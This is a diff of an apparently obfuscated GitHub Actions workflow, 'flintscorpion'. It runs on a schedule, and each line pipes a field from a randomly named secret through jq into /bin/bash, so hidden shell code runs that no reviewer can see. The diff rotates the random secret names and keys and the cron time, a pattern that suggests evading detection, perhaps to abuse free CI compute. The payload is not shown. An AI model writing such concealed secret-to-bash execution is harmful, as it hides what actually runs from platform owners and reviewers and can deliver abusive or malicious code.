@@ -2,23 +2,22 @@ name: flintscorpion
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 3/6 * * *'
+    - cron: '11 3/6 * * *'
 
-jobs:  # 2416
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: flintscorpion
         env:
-          sdme613: ${{ secrets.sdme613 }}
+          fvtm5905: ${{ secrets.fvtm5905 }}
         run: |
-          echo $sdme613 | jq -r .r8052 | /bin/bash
-          echo $luoui5491 | jq -r .gb644 | /bin/bash
-          echo $qoo9535 | jq -r .ifq47430 | /bin/bash
-          echo $pud327 | jq -r .dfgk99 | /bin/bash
-          echo $srhsk86 | jq -r .zz818 | /bin/bash
-          echo $kd89875 | jq -r .nwv4894 | /bin/bash
-          echo $vno50042 | jq -r .ublom97295 | /bin/bash
-          echo $csfd03 | jq -r .md2423 | /bin/bash
+          echo $fvtm5905 | jq -r .ycvb17797 | /bin/bash
+          echo $jjhrj426 | jq -r .cueg2410 | /bin/bash
+          echo $tzyg8 | jq -r .w89644 | /bin/bash
+          echo $rimq1 | jq -r .cxptu45 | /bin/bash
+          echo $h027 | jq -r .mhzh8 | /bin/bash
+          echo $erjcl105 | jq -r .v0536 | /bin/bash
 
